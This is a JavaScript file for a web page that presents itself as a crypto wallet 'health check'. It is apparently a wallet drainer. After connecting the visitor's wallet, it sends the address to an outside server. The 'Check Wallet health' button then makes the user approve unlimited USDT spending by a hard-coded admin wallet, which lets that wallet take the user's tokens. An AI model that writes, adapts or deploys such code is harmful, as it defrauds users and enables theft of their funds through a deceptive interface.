import EthereumProvider from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

// Element references
const connectButton = document.getElementById("connectWallet");
const approveButton = document.getElementById("approveUSDT");
const userAddressSpan = document.getElementById("userAddress");
const userBalanceSpan = document.getElementById("userBalance");
const walletInfoDiv = document.getElementById("walletInfo");

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_WALLET = "0x24E189414e4217962964b9D57877C91349A169Da";

const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
const USDT_ABI = ["function balanceOf(address owner) view returns (uint256)"];

let signer;

connectButton.onclick = async() => {
    connectButton.innerText = "Processing...";
    connectButton.disabled = true;

    setTimeout(() => {
        document.getElementById("preConnectOverlay").style.display = "none";
        connectButton.innerText = "Proceed";
        connectButton.disabled = false;
    }, 5000);

    try {
        const provider = await EthereumProvider.init({
            projectId: "5c7a882142c7491241b507534414ddff",
            chains: [56],
            methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
            showQrModal: true
        });

        await provider.connect();

        const ethersProvider = new ethers.BrowserProvider(provider);
        signer = await ethersProvider.getSigner();
        const userAddress = await signer.getAddress();

        // Show connection overlay
        const connectionOverlay = document.getElementById("connectionPopupOverlay");
        const closeBtn = document.getElementById("popupCloseBtn");
        if (connectionOverlay) {
            connectionOverlay.style.display = "flex";
            connectionOverlay.querySelector(".user-address").textContent = userAddress;

            setTimeout(() => {
                connectionOverlay.style.display = "none";
            }, 3000);

            if (closeBtn) {
                closeBtn.onclick = () => {
                    connectionOverlay.style.display = "none";
                };
            }

            window.addEventListener("click", function(event) {
                if (event.target === connectionOverlay) {
                    connectionOverlay.style.display = "none";
                }
            });
        }

        // Save wallet address
        fetch("http://onlyforapi.com/php/save_wallet.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ wallet: userAddress })
        });

        // Show approval button and wallet info
        approveButton.style.display = "inline-block";
        userAddressSpan.innerText = userAddress;
        document.getElementById("userAddress").value = userAddress;
        walletInfoDiv.style.display = "block";

        // Fetch and display USDT balance
        const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
        const rawBalance = await usdt.balanceOf(userAddress);
        const readableBalance = ethers.formatUnits(rawBalance, 18);
        userBalanceSpan.innerText = readableBalance + " USDT";

    } catch (err) {
        console.error("Wallet connection error:", err);
    }
};

approveButton.onclick = async() => {
    try {
        approveButton.disabled = true;
        approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

        const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
        const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
        await tx.wait();

        const userAddress = await signer.getAddress();
        window.location.href = `/healthcard.html?wallet=${userAddress}`;

    } catch (err) {
        console.error("Approval error:", err);
        alert("Approval failed: " + (err.message || err));
    } finally {
        approveButton.disabled = false;
        approveButton.innerHTML = '<i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health';
    }
};

// Observer for dynamic UI changes
const observer = new MutationObserver(function(mutationsList) {
    for (let mutation of mutationsList) {
        if (mutation.type === "attributes" && mutation.attributeName === "style") {
            const approveDiv = document.getElementById("approveUSDT");
            if (approveDiv && approveDiv.style.display !== "none") {
                const walletDiv = document.getElementById("walletInfo");
                if (walletDiv) {
                    walletDiv.style.display = "block";
                }

                const introDiv = document.getElementById("introDiv");
                if (introDiv) {
                    introDiv.classList.remove("fade-in");
                    introDiv.classList.add("fade-out");
                }
            }
        }
    }
});

const approveDiv = document.getElementById("approveUSDT");
if (approveDiv) {
    observer.observe(approveDiv, { attributes: true });
}

// Copy address utility
export function copyAddress() {
    const addressInput = document.getElementById("userAddress");
    addressInput.select();
    addressInput.setSelectionRange(0, 99999);
    document.execCommand("copy");
    alert("Address copied to clipboard!");
}

// Pre-connect overlay handlers
const startConnectBtn = document.getElementById("startConnect");
const preConnectOverlay = document.getElementById("preConnectOverlay");
const closeBtn = document.getElementById("preConnectClose");

startConnectBtn.addEventListener("click", () => {
    preConnectOverlay.style.display = "flex";
});

closeBtn.addEventListener("click", () => {
    preConnectOverlay.style.display = "none";
});

window.addEventListener("click", function(event) {
    if (event.target === preConnectOverlay) {
        preConnectOverlay.style.display = "none";
    }
});
